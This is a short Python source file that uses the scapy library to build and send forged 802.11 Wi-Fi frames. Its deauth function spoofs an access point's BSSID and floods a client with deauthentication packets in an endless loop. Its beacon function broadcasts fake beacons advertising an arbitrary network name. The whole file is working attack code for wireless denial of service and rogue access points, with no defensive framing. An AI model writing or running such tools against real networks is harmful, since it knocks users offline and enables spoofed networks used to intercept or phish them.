from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt


def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
    packet = RadioTap() / \
        Dot11(type=0, subtype=12, addr1=client, addr2=BSSID, addr3=BSSID) / \
        Dot11Deauth(reason=reason)
    print(f'SENDING DEAUTH to {BSSID}')

    sendp(packet, iface=iface, loop=1, inter=0.01)


def beacon(iface: str, BSSID: str, SSID: str, timeout: int = 20):
    packet = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=BSSID, addr3=BSSID) / \
        Dot11Beacon() / \
        Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
    print(f'SENDING BEACON for {BSSID}')

    sendp(packet, iface=iface, inter=0.100, timeout=timeout)
